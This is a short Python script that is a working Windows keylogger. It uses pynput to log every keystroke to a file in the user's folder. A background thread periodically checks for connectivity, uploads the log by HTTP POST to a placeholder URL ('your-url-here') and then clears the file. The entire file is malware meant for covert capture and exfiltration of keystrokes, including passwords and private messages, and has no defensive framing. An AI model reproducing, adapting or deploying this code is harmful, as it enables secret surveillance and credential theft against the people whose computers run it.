from pynput.keyboard import Listener
import os
import requests
import threading
import time
i = 0
a = 2
#encode('utf-8')
def exfil():
    user = os.getlogin()
    path = "C:\\Users\\"+user+"\\logs.txt"
    file = open(path, "r")
    data1 = file.read()
    par = {"data":data1}
    req = requests.post("http://your-url-here", params=par)
    f2 = open(path, "w")
    f2.write("")
def exfil_daemon():
    i = 1
    while i!=100:
        time.sleep(300)
        r = requests.get("https://duckduckgo.com")
        if r.status_code == 200:
            exfil()
        elif r.status_code == 301:
            exfil()
        elif r.status_code==404:
            exfil()
user = os.getlogin()
path = "C:\\Users\\"+user+"\\logs.txt"
def write(key):
    #letter1  = "kiba"
    letter = str(key)
    letter =  " " + letter + "\n"
    #letter = letter.replace("u", "")
    print(letter)
    fil = open(path, "a+")
    fil.write(letter)
t = threading.Thread(target=exfil_daemon)
t.daemon = True
t.start()
with Listener(on_press=write) as l:
     l.join()
